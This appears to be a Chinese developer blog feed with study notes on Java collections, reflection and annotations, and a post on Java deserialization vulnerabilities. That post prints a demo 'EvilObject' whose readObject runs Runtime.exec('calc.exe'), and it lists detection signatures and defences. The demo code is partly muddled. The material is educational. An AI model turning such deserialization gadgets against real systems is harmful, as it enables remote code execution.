红黑树并不是一个完美平衡二叉查找树，根结点P的左子树显然比右子树高，但左子树和右子树的黑结点的层数是相等的，也即任意一个结点到到每个叶子结点的路径都包含数量相同的黑结点(性质5)。所以我们叫红黑树这种平衡为黑色完美平衡。<br>  只需要记住红黑树总是通过旋转和变色达到自平衡</p><p>  <strong>红黑树查找：</strong><br>  因为红黑树是一颗二叉平衡树，并且查找不会破坏树的平衡，所以查找跟二叉平衡树的查找无异：<br>  从根结点开始查找，把根结点设置为当前结点；若当前结点为空，返回null；若当前结点不为空，用当前结点的key跟查找key作比较；若当前结点key等于查找key，那么该key就是查找目标，返回当前结点；若当前结点key大于查找key，把当前结点的左子结点设置为当前结点，重复步骤2；若当前结点key小于查找key，把当前结点的右子结点设置为当前结点，重复步骤2；</p><p>  <strong>红黑树插入：</strong><br>  插入操作包括两部分工作：一查找插入的位置；二插入后自平衡。查找插入的父结点很简单，跟查找操作区别不大：<br>  从根结点开始查找；若根结点为空，那么插入结点作为根结点，结束。若根结点不为空，那么把根结点作为当前结点；若当前结点为null，返回当前结点的父结点，结束。若当前结点key等于查找key，那么该key所在结点就是插入结点，更新结点的值，结束。若当前结点key大于查找key，把当前结点的左子结点设置为当前结点，重复步骤4；若当前结点key小于查找key，把当前结点的右子结点设置为当前结点，重复步骤4；</p><h4 id="HashMap-amp-Hashtable-的区别"><a href="#HashMap-amp-Hashtable-的区别" class="headerlink" title="HashMap &amp; Hashtable 的区别"></a>HashMap &amp; Hashtable 的区别</h4><p>  存储：HashMap 允许 key 和 value 为 null，而 Hashtable 不允许。<br>  线程安全：Hashtable 是线程安全的，而 HashMap 是非线程安全的。<br>  推荐使用：在 Hashtable 的类注释可以看到，Hashtable 是保留类不建议使用，推荐在单线程环境下使用 HashMap 替代，如果需要多线程使用则用 ConcurrentHashMap 替代。<br>  HashMap 同一时间允许多个线程同时进行操作，Hashtable 同一时间只允许一个线程进行操作。<br>  HashMap 无论主键还是值都可以存放null，Hashtable 对null”零容忍”</p><h4 id="如何决定使用-HashMap-还是-TreeMap？"><a href="#如何决定使用-HashMap-还是-TreeMap？" class="headerlink" title="如何决定使用 HashMap 还是 TreeMap？"></a>如何决定使用 HashMap 还是 TreeMap？</h4><p>  TreeMap默认是按照Key值升序排序的；TreeMap的实现是基于红黑树结构，适用于按自然顺序或自定义顺序遍历键（key）。<br>  HashMap的分布是散列的、均匀的，不支持排序；数据结构主要是桶(数组)，链表或红黑树，适用于在Map中插入、删除和定位元素。<br>  <strong>如果你需要得到一个有序的结果时就应该使用TreeMap（因为HashMap中元素的排列顺序是不固定的）。除此之外，由于HashMap有更好的性能，所以大多不需要排序的时候我们会使用HashMap，简单来说，需要排序就用TreeMap，不需排序则使用 HashMap。</strong></p><h4 id="遍历List的三种方法"><a href="#遍历List的三种方法" class="headerlink" title="遍历List的三种方法"></a>遍历List的三种方法</h4><pre class="line-numbers language-Java"><code class="language-Java">List<String> list = new ArrayList<String>();//第一种方式，普通for循环for(int i = 0; i < list.size(); i++)&#123;    System.out.println(list.get(i));&#125;//第二种方式，使用迭代器for(Iterator<String> iter = list.iterator(); iter.hasNext();)&#123;    System.out.println(iter.next());&#125;//第三种方式，使用增强型的for循环//for(类型 每个元素的名字: 对象)for(String str: list)&#123;    System.out.println(str);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Collections的排序与乱序"><a href="#Collections的排序与乱序" class="headerlink" title="Collections的排序与乱序"></a>Collections的排序与乱序</h4><p>  <strong>shuffle方法:</strong> 随机排列，只能在有排列顺序的List接口中使用<br>若集合元素个数小于shufle闽值或者集合支持随机访问，那么从后往前遍历集合，交换元素。<br>否则先将集合转化为数组(提高访问效率) ，再进行遍历交换元素(在数组中进行)，最后设置集合元素。</p><p>  <strong>sort方法:</strong> 排序排列，Collections的sort专门给List排序，而Arrays中sort方法专门给数组进行排序<br>sort方法只能对同种类型集合进行排序，并且只能对集合进行升序排序。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>  <strong>终于把Java基础部分大致写完了，接下来我得先接着鸽一段时间，去复习期末考了。咕咕咕~</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java序列化和反序列化</title>
      <link href="/2023/12/19/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/12/19/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h3 id="序列化与反序列化概念"><a href="#序列化与反序列化概念" class="headerlink" title="序列化与反序列化概念"></a>序列化与反序列化概念</h3><p>  Java序列化是指把Java对象转换为字节序列的过程；<br>  Java反序列化是指把字节序列恢复为Java对象的过程；</p><p>  Java的序列化技术就是把对象转换成一串由二进制字节组成的数组，然后将这二进制数据保存在磁盘或传输网络。<br>  而后需要用到这对象时，磁盘或者网络接收者可以通过反序列化得到此对象，达到对象持久化的目的。<br>反序列化条件：</p><ul><li>该类必须实现 <code>java.io.Serializable</code> 对象</li><li>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的（注明是瞬态的，使用<code>transient</code>）<br>序列化过程：</li><li>序列化：将 <code>OutputStream</code> 封装在 <code>ObjectOutputStream</code> 内，然后调用 <code>writeObject </code>即可</li><li>反序列化：将 <code>InputStream</code> 封装在 <code>ObjectInputStream</code> 内，然后调用 <code>readObject </code>即可</li></ul><h3 id="序列化与反序列化操作"><a href="#序列化与反序列化操作" class="headerlink" title="序列化与反序列化操作"></a>序列化与反序列化操作</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>  PHP序列化字符串基本上是可人读的，而且对于类对象来说，字段等成员属性的序列化顺序与定义顺序一致；PHP经过序列化生成类似<code>O:17:&quot;SerializationDemo&quot;:2:...</code>的字符串而对象经过Java序列化后得到的则是一个二进制串。</p><h5 id="序列化过程"><a href="#序列化过程" class="headerlink" title="序列化过程"></a>序列化过程</h5><ol><li>ObjectOutputStream实例初始化时，将魔术头和版本号写入bout （BlockDataOutputStream类型） 中</li><li>调用ObjectOutputStream.writeObject()开始写对象数据<ul><li>写入对象类型标识</li><li>writeClassDesc()进入分支writeNonProxyDesc()写入类描述数据</li><li>writeSerialData()写入对象的序列化数据</li><li>写入类描述符标识</li><li>写入类名</li><li>写入SUID（当SUID为空时，会进行计算并赋值）</li><li>计算并写入序列化属性标志位</li><li>写入字段信息数据</li><li>写入Block Data结束标识</li><li>写入父类描述数据</li><li>若类自定义了writeObject()，则调用该方法写对象，否则调用defaultWriteFields()写入对象的字段数据 （若是非原始类型，则递归处理子对象）</li><li>ObjectStreamClass.lookup()封装待序列化的类描述 （返回ObjectStreamClass类型） ，获取包括类名、自定义serialVersionUID、可序列化字段 （返回ObjectStreamField类型） 和构造方法，以及writeObject、readObject方法等</li><li>writeOrdinaryObject()写入对象数据</li></ul></li></ol><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><h5 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h5><p>  Java程序中类ObjectInputStream的readObject方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的class对象，ObjectStreamClass包含了类的名称及serialVersionUID。</p><h5 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="*serialVersionUID"></a><code>*serialVersionUID</code></h5><p>  serialVersionUID适用于java序列化机制。简单来说，JAVA序列化的机制是通过serialVersionUID判断类的<br>  serialVersionUID来验证的版本一致的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较。<br>  如果相同说明是一致的，可以进行反序列化，否则会出现反序列化版本一致的异常，即是InvalidCastException。</p><h3 id="反序列化漏洞的基本原理"><a href="#反序列化漏洞的基本原理" class="headerlink" title="反序列化漏洞的基本原理"></a>反序列化漏洞的基本原理</h3><p>  在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法被重写不当时产生漏洞此处重写了readObject方法，执行<code>Runtime.getRuntime().exec()</code><br>  defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行方法<br>运行流程：<br>  1.myObj对象序列化进object文件<br>  2.object反序列化对象-&gt;调用readObject方法-&gt;执行<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code></p><p><a href="https://smms.app/image/lV8EkChBzjDSPUs" target="_blank"><img src="https://s2.loli.net/2023/12/20/lV8EkChBzjDSPUs.jpg" alt="Java反射安全.png"></a></p><p>也就是<code>field.setAccessible(true);</code>所造成的问题。<br>再加上以下方法就能造成安全问题</p><pre><code>forName  获取类newInstance  实例化类对象getMethod   获取函数invoke   执行函数writeObject()   序列化，将Object输出成Byte流readObject()   反序列化，将Byte流输出成Object</code></pre><p>  例如：利用反射机制，重写readObject方法，加入能够进行命令执行的函数Runtime.getRuntime()，执行calc.exe命令调出计算器</p><pre class="line-numbers language-Java"><code class="language-Java">import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;//创建一个可序列化的接口类public class CommandExecution implements Serializable &#123;    public static void main(String[] args) throws Exception &#123;        // 创建一个恶意的对象        EvilObject evilObject = new EvilObject();        // 序列化恶意对象        byte[] serializedData = serialize(evilObject);        // 反序列化恶意对象        deserialize(serializedData);    &#125;    // 序列化对象    private static byte[] serialize(Object obj) throws IOException &#123;        ObjectOutputStream out = new ObjectOutputStream(System.out);        out.writeObject(obj);        out.close();        return null;    &#125;    // 反序列化对象    private static void deserialize(byte[] serializedData) throws Exception &#123;        ObjectInputStream in = new ObjectInputStream(System.in);        in.readObject();        in.close();    &#125;    // 恶意对象    static class EvilObject implements Serializable &#123;        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123;            in.defaultReadObject();            // 利用反射获取Runtime类            Class<?> runtimeClass = Class.forName("java.lang.Runtime");            // 创建InvocationHandler实现类            InvocationHandler handler = new InvocationHandler() &#123;                @Override                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;                    if (method.getName().equals("exec")) &#123;                        // 执行命令                        Runtime.getRuntime().exec("calc.exe");                    &#125;                    return null;                &#125;            &#125;;            // 创建代理对象            Object proxy = Proxy.newProxyInstance(runtimeClass.getClassLoader(), new Class<?>[]&#123;runtimeClass&#125;, handler);            // 更改反射获取到的Runtime类的私有静态属性            Field field = runtimeClass.getDeclaredField("currentRuntime");            field.setAccessible(true);            field.set(null, proxy);        &#125;    &#125;&#125;代码将序列化和反序列化放在了一起，实际利用漏洞时可能是分开的。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般实现命令执行的时候有两个方向可以努力：</p><ol><li>控制代码、函数：就像命名注入等注入类漏洞一样数据被当作了代码执行；或者重写readObject，加入自定义的代码</li><li>控制输入、数据、变量：利用代码中已有的函数和逻辑，通过改变输入内容的形态实现流程的控制(不同的输入会走不同的逻辑流程，执行不同的代码块中的代码)</li></ol><p>  对于Java反序列化漏洞来说，这属于控制数据输入一类。在调用反射机制触发漏洞时，有两个基本点必须要满足：</p><ol><li>有一个可序列化的类，并且该类是重写了readObject()方法的(由于不存在代码注入，只能查找已有代码逻辑中是否有这样的类)</li><li>在重写的readObject()方法的逻辑中有method.invoke函数出现，而且参数可控。</li></ol><h3 id="反序列化防护"><a href="#反序列化防护" class="headerlink" title="反序列化防护"></a>反序列化防护</h3><ol><li>从流量中发现序列化的痕迹，关键字：<code>ac ed 00 05</code>，<code>rO0AB</code></li><li>Java RMI 的传输 100% 基于反序列化，Java RMI 的默认端口是1099端口</li><li>从源码入手，可以被序列化的类一定实现了Serializable接口<ul><li>放在classpath，将应用代码中的java.io.ObjectInputStream替换为SerialKiller，之后配置让其能够允许或禁用一些存在问题的类</li><li>SerialKiller有HotReload,Whitelisting,Blacklisting几个特性，控制了外部输入反序列化后的可信类型。</li></ul></li><li>观察反序列化时的readObject()方法是否重写，重写中是否有设计不合理，可以被利用之处</li><li>对 className 进行白名单校验</li></ol><pre class="line-numbers language-Java"><code class="language-Java">public final class test extends ObjectInputStream&#123;    ...    protected Class<?> resolveClass(ObjectStreamClass desc)            throws IOException, ClassNotFoundException&#123;         if(!desc.getName().equals("className"))&#123;            throw new ClassNotFoundException(desc.getName()+" forbidden!");        &#125;        returnsuper.resolveClass(desc);    &#125;      ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>通过扩展 SecurityManager 禁止 JVM 执行外部命令 Runtime.exec</li><li>第三方jar包是否提供了一些公共的反序列化操作接口，是否有相应的安全校验如白名单校验方案</li></ol><p>  剩下的内容暂时不写，请看<a href="https://trganda.github.io/notes/security/java/roadmap/Java-%E5%AE%89%E5%85%A8---%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">Java 安全 - 原生反序列化漏洞</a>和<a href="https://paper.seebug.org/312/#9">深入理解 JAVA 反序列化漏洞</a><br>以后会单独出一章来写Java安全的内容</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射</title>
      <link href="/2023/12/18/Java%E5%8F%8D%E5%B0%84/"/>
      <url>/2023/12/18/Java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><h3 id="Java注解概述"><a href="#Java注解概述" class="headerlink" title="Java注解概述"></a>Java注解概述</h3><p>注解也叫元数据。一种代码级别的说明。它可以声明在包、类、字段、方法、局部变量、方法参数等的前面，用来对这些元素进行说明注释。</p><h3 id="注解分类"><a href="#注解分类" class="headerlink" title="注解分类"></a>注解分类</h3><ul><li>标记注解： 没有参数的注解，仅用自身的存在与否为程序提供信息，如<code>@Override</code>注解，该注解没有参数，用于表示当前方法为重写方法。</li><li>单值注解： 只有一个参数的注解，如果该参数的名字为value，那么可以省略参数名，如 <code>@SuppressWarnings(value = &quot;all&quot;)</code>，可以简写为<code>@SuppressWarnings(&quot;all&quot;)</code>。</li><li>完整注解： 有多个参数的注解。</li><li>自定义注解：使用反射机制解析注解</li></ul><h3 id="注解作用"><a href="#注解作用" class="headerlink" title="注解作用"></a>注解作用</h3><ol><li>Java中是有三种注释的，分别为单行注释、多行注释和文档注释。@开头的元注解，这就是基于文档注释的注解。</li><li>使用反射来通过代码里标识的元数据对代码进行分析</li><li>用来做特定的编译检查，为代码提供了一种规范制约，避免我们后续在代码中处理太多的代码以及功能的规范</li></ol><h3 id="常见注解"><a href="#常见注解" class="headerlink" title="常见注解"></a>常见注解</h3><p>【内置注解】</p><ol><li>@Deprecated – 所标注内容不再被建议使用；</li><li>@Override – 只能标注方法，表示该方法覆盖父类中的方法；</li><li>@SuppressWarnings – 所标注内容产生的警告，编译器会对这些警告保持静默；</li><li>@interface – 用于定义一个注解；</li><li>@Documented –将所标注内容包含到javadoc中；</li><li>@Inherited – 只能被用来标注“Annotation类型”，它所标注的Annotation具有继承性，跟类的继承形式同意；</li><li>@Retention – 只能被用来标注“Annotation类型”，而且它被用来指定Annotation的RetentionPolicy属性,它表示注解存在阶段是保留在源码（编译期），字节码（类加载）或者运行期（JVM中运行）</li></ol><p>【元注解】</p><ol><li>@Target:用于描述注解的使用范围即被描述的注解可以用在什么地方</li><li>@Retention:表示需要在什么级别保存该注释信息，用于描述注解的生命周期(SOURCE &lt; CLASS &lt; RUNTIME)</li><li>@Document: 说明该注解将被包含在javadoc中</li><li>@Inherited:说明子类可以继承父类中的该注解</li></ol><p>【自定义注解】</p><ol><li>@interface用来声明一个注解，格式:public @interface 注解名{定义内容}</li><li>其中的每一个方法实际上是声明了一个配置参数</li><li>方法的名称就是参数的名称</li><li>返回值类型就是参数的类型(返回值只能是基本类型,Class,String,enum)</li><li>可以通过default来声明参数的默认值</li><li>如果只有一个参数成员，一般参数名为value</li><li>注解元素必须要有值，我们定义注解元素时，经常使用空字符串，0作为默认值</li></ol><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><h3 id="静态语言和动态语言"><a href="#静态语言和动态语言" class="headerlink" title="静态语言和动态语言"></a>静态语言和动态语言</h3><p><strong>动态语言</strong><br>运行时可以改变其结构的语言:例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。主要动态语言: Obiect-C、C#、JavaScript、PHP、Python等<br><strong>静态语言</strong><br>与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++</p><h3 id="反射概念"><a href="#反射概念" class="headerlink" title="反射概念"></a>反射概念</h3><p>反射机制允许程序在执行期借助于Reflection API取得任何类的内部信息，并能直接操作任意对象的内部属性及方法。</p><pre class="line-numbers language-Java"><code class="language-Java">Class c = Class.forName(“java.lang.String”)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>加载完类之后，在堆内存的方法区中就产生了一个Class类型的对象(一个类只有这个对象就包含了完整的类的结构信息。<br>我们可以通过这个Class对象看到类的结构。这个对象就像一面镜子，透过这个镜子看到类的结构，所以我们形象的称之为:反射<br><a href="https://smms.app/image/g2HYe3Cw6tSKoPz" target="_blank"><img src="https://s2.loli.net/2023/12/18/g2HYe3Cw6tSKoPz.jpg" ></a></p><h3 id="反射的功能"><a href="#反射的功能" class="headerlink" title="反射的功能"></a>反射的功能</h3><ol><li>在运行时判断任意一个对象所属的类</li><li>在运行时构造任意一个类的对象</li><li>在运行时判断任意一个类所具有的成员变量和方法</li><li>在运行时获取泛型信息</li><li>在运行时调用任意一个对象的成员变量和方法</li><li>在运行时处理注解</li><li><strong>生成动态代理（重要）</strong></li></ol><h3 id="常用Class类反射方法（如何使用反射）"><a href="#常用Class类反射方法（如何使用反射）" class="headerlink" title="常用Class类反射方法（如何使用反射）"></a>常用Class类反射方法（如何使用反射）</h3><p><a href="https://smms.app/image/knT4QSyE8XI6h5t" target="_blank"><img src="https://s2.loli.net/2023/12/18/knT4QSyE8XI6h5t.jpg" ></a></p><h5 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h5><pre class="line-numbers language-Java"><code class="language-Java">public class Apple &#123;        ......&#125;Class<Apple> clazz;// 1. 直接.classclazz = Apple.class;// 2. 通过 类的全路径clazz = (Class<Apple>) Class.forName("collection.Apple");// 3. 类加载器加载clazz = (Class<Apple>) Thread.currentThread().getContextClassLoader().loadClass("collection.Apple");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h5><pre class="line-numbers language-Java"><code class="language-Java">// 获取所有字段 getDeclaredFieldsArrays.asList(Apple.class.getDeclaredFields()).forEach(f->System.out.println(f.getName()));// 获取单个字段Apple.class.getDeclaredField("area").getName();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="修改字段值"><a href="#修改字段值" class="headerlink" title="修改字段值"></a>修改字段值</h5><pre class="line-numbers language-Java"><code class="language-Java">Apple apple = new Apple();apple.setArea("深圳");// 获取area字段Field field = Apple.class.getDeclaredField("area");    ***      // private字段，需要强制    ***      field.setAccessible(true);// 将值修改成长沙field.set(apple, "长沙");System.out.println(apple.getArea());  //长沙<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="通过反射创建类对象"><a href="#通过反射创建类对象" class="headerlink" title="通过反射创建类对象"></a>通过反射创建类对象</h5><p>通过反射创建类对象主要有两种方式：通过 Class 对象的 newInstance() 方法、通过 Constructor 对象的 newInstance() 方法。</p><p><strong>第一种：通过 Class 对象的 newInstance() 方法。</strong></p><pre class="line-numbers language-Java"><code class="language-Java">Class clz = Apple.class;Apple apple = (Apple)clz.newInstance();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>第二种：通过 Constructor 对象的 newInstance() 方法</strong></p><pre class="line-numbers language-Java"><code class="language-Java">Class clz = Apple.class;Constructor constructor = clz.getConstructor(String.class, int.class);Apple apple = (Apple)constructor.newInstance("红富士", 15);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通过 Constructor 对象创建类对象可以选择特定构造方法，而通过 Class 对象则只能使用默认的无参数构造方法。</p><h5 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h5><p>我们通过 Class 对象的 getFields() 方法可以获取 Class 类的属性，但无法获取私有属性。</p><pre class="line-numbers language-Java"><code class="language-Java">Class clz = Apple.class;Field[] fields = clz.getFields();for (Field field : fields) &#123;    System.out.println(field.getName());&#125;输出：price<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而如果使用 Class 对象的 getDeclaredFields() 方法则可以获取包括私有属性在内的所有属性：</p><pre class="line-numbers language-Java"><code class="language-Java">Class clz = Apple.class;Field[] fields = clz.getDeclaredFields();for (Field field : fields) &#123;    System.out.println(field.getName());&#125;输出：nameprice<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与获取类属性一样，当我们去获取类方法、类构造器时，如果要获取私有方法或私有构造器，则必须使用有 declared 关键字的方法。</p><h5 id="执行方法"><a href="#执行方法" class="headerlink" title="执行方法"></a>执行方法</h5><pre class="line-numbers language-Java"><code class="language-Java">Apple apple = new Apple();apple.setArea("深圳");// 获取setArea 方法Method m = Apple.class.getDeclaredMethod("setArea", String.class);// 调用apple对象的 setAream.invoke(apple, "长沙");System.out.println(apple.getArea()); // 输出长沙<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="获取继承的类，接口"><a href="#获取继承的类，接口" class="headerlink" title="获取继承的类，接口"></a>获取继承的类，接口</h5><pre class="line-numbers language-Java"><code class="language-Java">// 获取 继承的类Apple.class.getSuperclass()// 获取实现的接口Apple.class.getInterfaces()注意如果是几代继承就获取不到。比如A 实现B ，B实现C 。 获取A的getInterfaces就只能返回B ，而不返回C 。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="示例–反射实现SPI机制"><a href="#示例–反射实现SPI机制" class="headerlink" title="示例–反射实现SPI机制"></a>示例–反射实现SPI机制</h3><p><strong>通过改配置文件，来实现不同功能的切换。</strong></p><h5 id="定义两种功能（RedisCache和MemeCache）"><a href="#定义两种功能（RedisCache和MemeCache）" class="headerlink" title="定义两种功能（RedisCache和MemeCache）"></a>定义两种功能（RedisCache和MemeCache）</h5><pre class="line-numbers language-Java"><code class="language-Java">//缓存接口public interface Cache &#123;    // 设置缓存    void set(String key , String value);    //获取缓存    String get(String key);&#125;//redis 提供的缓存实现public class RedisCache implements Cache&#123;    @Override    public void set(String key, String value) &#123;        System.out.println("[redis缓存] set");    &#125;    @Override    public String get(String key) &#123;        System.out.println("[redis缓存] get");        return "";    &#125;&#125;//MemeCache 提供的缓存实现public class MemeCache implements Cache&#123;    @Override    public void set(String key, String value) &#123;        System.out.println("[MemeCache缓存] set");    &#125;    @Override    public String get(String key) &#123;        System.out.println("[MemeCache缓存] get");        return "";    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="spring-factory配置文件"><a href="#spring-factory配置文件" class="headerlink" title="spring.factory配置文件"></a>spring.factory配置文件</h5><pre class="line-numbers language-factory"><code class="language-factory"># collection.RedisCache 是RedisCache类的全路径，代表项目要用redis缓存collection.RedisCache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="ServiceLoader实现功能"><a href="#ServiceLoader实现功能" class="headerlink" title="ServiceLoader实现功能"></a>ServiceLoader实现功能</h5><pre class="line-numbers language-Java"><code class="language-Java">public class ServiceLoader &#123;    // 读取spring.factorys文件     private static Map<Class<?>, Class<?>> doFind() throws IOException &#123;        Path f = Paths.get(ServiceLoader.class.getResource("/").getPath().substring(1), "META-INF/spring.factorys");        List<String> strs = Files.readAllLines(f, Charset.forName("UTF-8"));        final Map<Class<?>, Class<?>> map = new HashMap<>();                // 把行内容变成 Map key： 接口 value:对应的实现类 ，再获取实现的接口        for (String line : strs) &#123;            try &#123;                Class<?> impl = Class.forName(line);                map.put(Class.forName(line).getInterfaces()[0], impl);            &#125; catch (Exception e) &#123;            &#125;        &#125;        return map;    &#125;        @SuppressWarnings("unchecked")    public static <T> T load(Class<T> inter) throws Exception &#123;            // 加载 spring.factorys文件        Map<Class<?>, Class<?>> mapper = doFind();                // 查找 对应的实现类        Class<T> impl = (Class<T>) mapper.get(inter);        if (impl == null) &#123;            return null;        &#125;                // 否则 利用反射生成 实现        return doCreate(impl);    &#125;        // 反射实例化对象    private static <T> T doCreate(Class<T> impl) throws InstantiationException, IllegalAccessException &#123;        return impl.newInstance();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h5><ol><li>利用Paths加载${项目}/META-INF/spring.factorys文件，找到具体用哪个实现类。</li><li>将上述实现类forClass得到Class对象，并通过getInterfaces获取其实现的接口，封装成Map&lt;接口Class，实现类Class&gt;。</li><li>匹配load方法用户传过来的接口，通过上面map得到实现类，通过newInstance方法构造实例返回。</li></ol><h3 id="Java内存加载"><a href="#Java内存加载" class="headerlink" title="Java内存加载"></a>Java内存加载</h3><p><a href="https://smms.app/image/p5Yl7cxBDjRsor1" target="_blank"><img src="https://s2.loli.net/2023/12/20/p5Yl7cxBDjRsor1.jpg" ></a></p><p><a href="https://smms.app/image/7q1EmModVgfTpaH" target="_blank"><img src="https://s2.loli.net/2023/12/20/7q1EmModVgfTpaH.jpg" ></a></p><ol><li>类的加载 (Load) 类加载器完成将类的class文件读入内存并创建<code>java.lang.Class</code>对象操作。</li><li>类的链接 (Link) 将类的二进制数据合并进JRE，在合并的过程中可以对类进行校验，检查其是否存在安全问题，是否符合JVM语法规范，接着为类变量 (static) 分配内存和设置默认初始值，这些内存在方法区中进行分配。最后在虚拟机,中将常量名替换为引用地址。</li><li>类的初始化 (lnitialize) JVM对类进行初始化，过程中执行类构造器的方法，此方法是编译期自动收集类中的变量赋值动作和静态代码合并而成的，目标虚拟机会保证类构造器的方法会在多线程中被正确的加锁和同步。且在初始化过程中，如果发现类的父类还没有被初始化，则会优先初始化其父类。</li></ol><p><strong>类缓存：</strong>标准的JavaSE类加载器可以按要求查找类，但一旦某个类被加载到加载器中将维持加载（缓存）一段时间，不过JVM垃圾回收机制可以回收这些Class对象</p><h2 id="Java反射安全"><a href="#Java反射安全" class="headerlink" title="Java反射安全"></a>Java反射安全</h2><h3 id="反射带来的安全问题"><a href="#反射带来的安全问题" class="headerlink" title="反射带来的安全问题"></a>反射带来的安全问题</h3><ol><li>性能低-因为java反射动态地解析类型，它涉及处理像扫描类路径找到要加载的类，导致性能降低。 </li><li>安全限制-反射需要运行时权限，可能不适用于在安全管理器下运行的系统。这可能会导致应用程序在运行时由于安全管理器而失败。 </li><li>安全问题-使用反射，我们可以访问我们不应该访问的部分代码，例如，我们可以访问类的私有字段并更改它的值。这可能是一个严重的安全威胁，并导致您的应用程序的行为异常。 </li><li>高维护-反射代码很难理解和调试，在编译时也无法找到代码的任何问题，因为类可能不可用，使得它不太灵活和难以维护。</li></ol><h3 id="安全问题原理"><a href="#安全问题原理" class="headerlink" 